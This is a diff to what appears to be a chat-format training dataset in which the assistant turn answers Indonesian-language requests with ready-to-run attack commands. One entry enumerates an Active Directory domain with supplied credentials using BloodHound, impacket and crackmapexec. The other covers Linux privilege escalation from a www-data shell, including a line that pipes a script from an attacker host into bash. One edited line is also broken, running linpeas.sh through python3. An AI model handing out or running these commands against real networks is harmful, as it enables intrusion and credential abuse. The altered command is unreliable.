@@ -176,7 +176,7 @@ EXTRA_DATA_12 = [
 
     {"conversations": [
         {"from": "human", "value": "enum AD dari domain corporate.local pake credentials john:Password123"},
-        {"from": "gpt", "value": "```bash\n# BloodHound collection\npython3 " + B + "/post_exploit/BloodHound/bloodhound-python \\\n  -d corporate.local -u john -p Password123 \\\n  -c All -ns 192.168.1.100 -o bloodhound_data/\n\n# ldapdomaindump\nldapdomaindump -u 'corporate.local\\john' -p Password123 192.168.1.100\n\n# impacket enum\npython3 " + B + "/exploit/impacket/examples/GetADUsers.py \\\n  corporate.local/john:Password123 -all\n\n# SMB enum\ncrackmapexec smb 192.168.1.0/24 \\\n  -u john -p Password123 --shares --users\n```"}
+        {"from": "gpt", "value": "```bash\n# BloodHound collection\npython3 bloodhound-python \\\n  -d corporate.local -u john -p Password123 \\\n  -c All -ns 192.168.1.100 -o bloodhound_data/\n\n# ldapdomaindump\nldapdomaindump -u 'corporate.local\\john' -p Password123 192.168.1.100\n\n# impacket enum\npython3 " + B + "/exploit/impacket/examples/GetADUsers.py \\\n  corporate.local/john:Password123 -all\n\n# SMB enum\ncrackmapexec smb 192.168.1.0/24 \\\n  -u john -p Password123 --shares --users\n```"}
     ]},
 
     {"conversations": [
@@ -269,7 +269,7 @@ EXTRA_DATA_12 = [
 
     {"conversations": [
         {"from": "human", "value": "escalate privilege di Linux — udah dapat shell sebagai www-data"},
-        {"from": "gpt", "value": "```bash\n# Serve LinPEAS dari WSL attacker\npython3 -m http.server 8888 --directory " + B + "/post_exploit/LinPEAS/\n\n# Di target shell:\ncurl http://ATTACKER_IP:8888/linpeas.sh | bash 2>/dev/null | tee /tmp/lpe.txt\n\n# Cek sudo rights dulu\nsudo -l\n\n# SUID binaries\nfind / -perm -u=s -type f 2>/dev/null\n\n# Cek GTFOBins kalau ada binary menarik\n# https://gtfobins.github.io/\n\n# Kernel exploit suggester\npython3 " + B + "/exploit/Exploit-Suggester/linux-exploit-suggester-2.py -k $(uname -r | cut -d- -f1)\n\n# Writable cron jobs\ncrontab -l 2>/dev/null\ncat /etc/cron* 2>/dev/null | grep -v '^#'\nls -la /etc/cron*/\n```"}
+        {"from": "gpt", "value": "```bash\n# Serve LinPEAS dari WSL attacker\npython3 -m http.server 8888 --directory " + B + "/post_exploit/LinPEAS/\n\n# Di target shell:\ncurl http://ATTACKER_IP:8888/linpeas.sh | bash 2>/dev/null | tee /tmp/lpe.txt\n\n# Cek sudo rights dulu\nsudo -l\n\n# SUID binaries\nfind / -perm -u=s -type f 2>/dev/null\n\n# Cek GTFOBins kalau ada binary menarik\n# https://gtfobins.github.io/\n\n# Kernel exploit suggester\npython3 " + B + "/post_exploit/LinPEAS/linpeas.sh -k $(uname -r | cut -d- -f1)\n\n# Writable cron jobs\ncrontab -l 2>/dev/null\ncat /etc/cron* 2>/dev/null | grep -v '^#'\nls -la /etc/cron*/\n```"}
     ]},
 
     {"conversations": [
